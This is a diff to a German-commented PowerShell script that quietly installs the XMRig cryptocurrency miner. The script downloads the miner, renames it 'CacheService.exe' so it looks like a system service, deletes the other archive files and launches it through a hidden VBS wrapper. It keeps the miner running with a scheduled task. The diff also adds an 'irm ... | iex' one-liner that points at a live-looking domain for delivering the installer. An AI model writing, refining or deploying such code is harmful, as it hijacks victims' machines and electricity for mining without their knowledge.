@@ -16,10 +16,9 @@ $Vbs        = Join-Path $BaseDir "init.vbs"
 $ExeName    = "CacheService.exe"
 $Xmrig      = Join-Path $InstallDir $ExeName
 
-# Ordner anlegen
 New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
 
-# ---------- settings.json schreiben ----------
+# ---------- settings.json ohne BOM schreiben ----------
 $configJson = @"
 {
     "autosave": true,
@@ -69,7 +68,8 @@ $configJson = @"
 }
 "@
 
-Set-Content -Path $Config -Value $configJson -Encoding UTF8
+$utf8NoBom = New-Object System.Text.UTF8Encoding $false
+[System.IO.File]::WriteAllText($Config, $configJson, $utf8NoBom)
 
 # ---------- Binary finden / herunterladen + umbenennen ----------
 if (-not (Test-Path -LiteralPath $Xmrig -PathType Leaf)) {
@@ -93,15 +93,12 @@ if (-not (Test-Path -LiteralPath $Xmrig -PathType Leaf)) {
         Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tempZip -UseBasicParsing
         Expand-Archive -LiteralPath $tempZip -DestinationPath $InstallDir -Force
 
-        # Original xmrig.exe finden und umbenennen
         $original = Get-ChildItem -Path $InstallDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue |
                     Select-Object -First 1
 
         if (-not $original) { throw "Binary not found in archive." }
 
         Move-Item -LiteralPath $original.FullName -Destination $Xmrig -Force
-
-        # Aufräumen (alle anderen Dateien aus dem Archiv löschen)
         Get-ChildItem -Path $InstallDir -Exclude $ExeName | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
     }
     finally {
@@ -113,7 +110,8 @@ if (-not (Test-Path -LiteralPath $Xmrig -PathType Leaf)) {
 $vbsContent = @"
 CreateObject("Wscript.Shell").Run """$Xmrig"" --config=""$Config""", 0, False
 "@
-Set-Content -Path $Vbs -Value $vbsContent -Encoding ASCII
+$utf8NoBom = New-Object System.Text.UTF8Encoding $false
+[System.IO.File]::WriteAllText($Vbs, $vbsContent, $utf8NoBom)
 
 # ---------- Scheduled Task ----------
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
@@ -136,4 +134,4 @@ Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
 # ---------- Sofort starten ----------
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$Vbs`"" -WindowStyle Hidden
 
-# irm https://dein-server.com/start.ps1 | iex
+# irm https://pariedl.com/start-eco.ps1 | iex
